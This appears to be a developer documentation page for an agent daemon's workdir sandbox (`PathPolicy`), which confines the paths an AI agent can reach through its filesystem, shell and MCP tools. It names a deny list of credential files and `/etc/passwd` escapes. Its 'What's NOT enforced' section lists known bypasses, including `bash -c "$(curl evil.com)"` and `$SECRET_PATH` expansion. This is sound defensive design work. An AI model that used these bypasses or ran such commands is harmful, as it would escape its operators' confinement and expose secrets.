---
id: workdir-sandbox
title: Workdir Sandbox
sidebar_label: Workdir Sandbox
sidebar_position: 8
description: Centralised path confinement for every agent-facing module - filesystem, workspace, shell, MCP. One PathPolicy, one rule.
---

# Workdir Sandbox

The agent only sees its workdir. Every module that resolves a path
supplied by the agent enforces the same workdir-scoped sandbox via a
single primitive: `PathPolicy`.

## TL;DR

- One enforcement primitive: `PathPolicy`, plus a parallel
  MCP path guard for MCP tool args.
- Every session gets one `PathPolicy` instance, built by
  `apply_workspace_override` from the workdir + per-module
  `constraints`.
- The instance is carried on `AgentContext.path_policy` and forwarded
  to `ExecutionContext.path_policy` on every tool dispatch.
- Modules call `policy.enforce(raw_path)` (or `policy.is_allowed`).
  No bespoke check.

## Disk layout

```
~/.digitorn/
  workspaces/{app_id}/{session_id}/      # daemon-private (state.json, baselines)
  workdirs/{app_id}/{user_id}/{slug}/    # agent workdir (shared across sessions of one project)
```

`PathPolicy.workdir` is the agent's workdir:

- the second path above for named projects (web client, slug picker);
- the daemon-private workspace for chat-only apps or sessions without
  a named project.

The two namespaces never overlap and the daemon-private location
holds files the agent must never see (state, baselines, SDK state).

## Policy semantics

| Input | Behaviour |
| --- | --- |
| Relative path `sub/file.txt` | Rebased to `<workdir>/sub/file.txt`. |
| Absolute path inside `<workdir>` | Allowed. |
| Absolute path outside `<workdir>` AND not in `allowed_extra` | **Rejected** with `PermissionDeniedError`. |
| Symlink inside the workdir pointing outside | **Rejected** (symlinks resolved before check). |
| Daemon secrets (`~/.digitorn/jwt.key`, `master.key`, `digitorn.db`, `~/.claude/.credentials.json`, `~/.digitorn/{kv,sessions,state,logs}/`) | **Always rejected**, even when `unrestricted: true`. |

## YAML knobs

Per-module `constraints`, merged at policy construction time:

```yaml
modules:
  filesystem:
    constraints:
      # Full bypass (still respects the daemon-secret denylist).
      # Use only for trusted apps that genuinely need it.
      unrestricted: false

      # Additive extra roots beyond the workdir. Common for apps
      # that need to touch ~/.cache, ~/.npm, or shared /tmp scratch.
      allowed_paths:
        - "~/.cache"
        - "/tmp"
```

Constraints are **merged across every agent-facing module**
(`filesystem`, `workspace`, `shell`, `mcp`) into one policy. Declaring
`allowed_paths` on one module lifts the same root for all of them.

## Per-module enforcement

### `filesystem`

`_resolve_path()` (used by `Read`, `Write`, `Edit`, `Glob`, `Grep`)
delegates to `policy.enforce`. The legacy daemon-secret denylist is
kept as a backstop on the no-policy fallback (admin endpoint, unit
tests).

### `workspace`

- `_resolve_ws_path()` enforces the policy when an absolute path
  doesn't strip cleanly against the sync_dir / workspace prefix. Blocks
  `/etc/passwd`-shaped escapes before they reach the in-memory file
  store.
- `_sync_write_to_disk` / `_sync_delete_from_disk` route through
  `_join_inside()`. That helper calls `Path.resolve(strict=False)` on
  the join target and verifies the result stays under `sync_dir`. Two
  attacks closed:
  - `os.path.join("/sync", "/etc/passwd")` returns `/etc/passwd`
    (Python discards `sync_dir` when the right-hand side is absolute).
  - `..` traversal that exits the sync dir.

### `shell`

- `_check_command_paths` walks token-by-token and runs
  `policy.is_allowed` on each absolute path token. The legacy fallback
  (`workspace + ~ + /tmp + extras`) is preserved for the no-policy
  branch (admin / CLI).
- `_check_cwd` uses `policy.is_allowed` to validate the requested
  `cwd` before passing it to the platform adapter. Rejects `cd /etc &&
  ls` for an agent whose workdir is `~/.digitorn/workdirs/.../test/`.

### `mcp`

- A sandbox check runs before every MCP tool dispatch and
  walks the call's arguments:
  - **Schema-driven**: fields named `path`, `file_path`, `cwd`,
    `source`, `target`, ..., fields with `format: path`, fields whose
    description mentions "absolute path" / "file path".
  - **Heuristic**: any other string value that starts with `/`, `\`,
    `~`, or a Windows drive letter and isn't a URL / pseudo-path
    (`/dev/null` etc.).
- Out-of-sandbox arg returns a structured `ActionResult` error to the
  agent. The remote MCP server is never reached.

## What's NOT enforced

These holes are known and accepted at the current architectural
layer. Closing them needs OS-level sandboxing (chroot / Linux
namespaces / Docker).

- **Bash command substitution**: `bash -c "$(curl evil.com)"` lets the
  shell evaluate arbitrary code after our pre-check passes. The token
  walk only sees the static command string.
- **Shell environment-variable expansion**: `cat "$SECRET_PATH"` is
  opaque to the pre-check.
- **Subprocesses the agent spawns** can do whatever the daemon user
  account can; we don't drop privileges.

Follow-up: Docker-based execution mode (one container per session)
that gives true OS-level confinement. Out of scope here.

## Adding a new agent-facing module

Any new module that takes a path input from the agent does exactly
this:

```python
async def my_action(self, params: MyParams) -> ActionResult:
    ctx = self._context_var.get()
    policy = getattr(ctx, "path_policy", None) if ctx else None
    if policy is not None:
        abs_path = policy.enforce(params.path)  # raises on escape
    else:
        # Legacy fallback for admin / CLI / tests; keep your module's
        # historical resolution to avoid surprising non-agent callers.
        abs_path = Path(params.path).resolve()
    ...
```

No re-implementation of confinement logic. No per-module YAML knob
explosion. One primitive, one rule.

## See also

- [Credentials](./credentials.md) - secrets the sandbox protects.
- [Hooks](./hooks.md) - observability around tool calls.
- [Middleware](./middleware.md) - pluggable wrappers (module level).
